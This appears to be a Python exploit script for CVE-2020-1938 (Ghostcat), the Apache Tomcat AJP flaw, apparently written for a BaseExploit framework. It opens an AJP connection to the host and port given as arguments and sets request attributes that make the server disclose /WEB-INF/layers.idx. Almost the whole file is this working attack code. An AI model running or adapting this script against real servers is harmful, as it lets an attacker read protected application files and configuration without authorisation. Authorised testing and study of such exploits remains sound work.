from BaseExploit import *
import socket
import re
import os
from ajpy.ajp import AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException
from base64 import b64encode
from urllib.parse import unquote

# helpers
def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):
    fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)
    fr.method = method
    fr.protocol = "HTTP/1.1"
    fr.req_uri = req_uri
    fr.remote_addr = target_host
    fr.remote_host = None
    fr.server_name = target_host
    fr.server_port = 80
    fr.request_headers = {
        'SC_REQ_ACCEPT': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'SC_REQ_CONNECTION': 'keep-alive',
        'SC_REQ_CONTENT_LENGTH': '0',
        'SC_REQ_HOST': target_host,
        'SC_REQ_USER_AGENT': 'Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0',
        'Accept-Encoding': 'gzip, deflate, sdch',
        'Accept-Language': 'en-US,en;q=0.5',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0'
    }
    fr.is_ssl = False
    fr.attributes = []
    return fr


class Tomcat(object):
    def __init__(self, target_host, target_port):
        self.target_host = target_host
        self.target_port = target_port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.connect((target_host, target_port))
        self.stream = self.socket.makefile("rb")
    
    def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]):
        self.req_uri = req_uri
        self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))
        if user is not None and password is not None:
            creds = b64encode(("%s:%s" % (user, password)).encode('utf-8')).decode('utf-8')
            self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + creds

        for h in headers:
            self.forward_request.request_headers[h] = headers[h]

        for a in attributes:
            self.forward_request.attributes.append(a)

        responses = self.forward_request.send_and_receive(self.socket, self.stream)
        if len(responses) == 0:
            return None, None

        snd_hdrs_res = responses[0]

        data_res = responses[1:-1]

        return snd_hdrs_res, data_res

def CVE_2020_1938(host, port):
    
    bf = Tomcat(host, port)
    attributes = [
        {"name": "req_attribute", "value": ("javax.servlet.include.request_uri", "/",)},
        # {"name": "req_attribute", "value": ("javax.servlet.include.path_info", args.file_path,)},
        {"name": "req_attribute", "value": ("javax.servlet.include.path_info", "/WEB-INF/layers.idx",)},
        {"name": "req_attribute", "value": ("javax.servlet.include.servlet_path", "/",)},
    ]
    hdrs, data = bf.perform_request("/ROOT" + "/xxxxx.jsp", attributes=attributes)

Exploit(CVE_2020_1938, args.host, args.port)()